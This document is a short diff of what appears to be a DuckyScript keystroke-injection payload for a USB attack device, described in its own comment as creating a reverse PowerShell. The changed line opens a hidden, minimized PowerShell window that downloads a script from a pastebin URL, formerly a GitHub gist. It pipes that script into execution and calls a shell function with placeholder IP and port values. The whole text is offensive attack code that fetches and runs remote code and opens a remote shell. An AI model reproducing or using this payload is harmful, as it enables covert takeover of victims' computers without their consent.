@@ -2,5 +2,5 @@ REM Creates and executes a reverse powershell
 DELAY {start_delay}
 GUI r
 DELAY 350
-STRING cmd /c start /min powershell -w hidden "cmd /c curl https://gist.githubusercontent.com/Sigurd-Pettersen/573900738c18474e37052a1937377c88/raw/4c5d4462db24ef6eb6eae95f7ecc6564460d9ccb/p|iex;shell '{ip}' {port}"
+STRING cmd /c start /min powershell -w hidden "cmd /c curl https://pastebin.com/raw/Ytikm5KS|iex;shell '{ip}' {port}"
 {windows_admin}
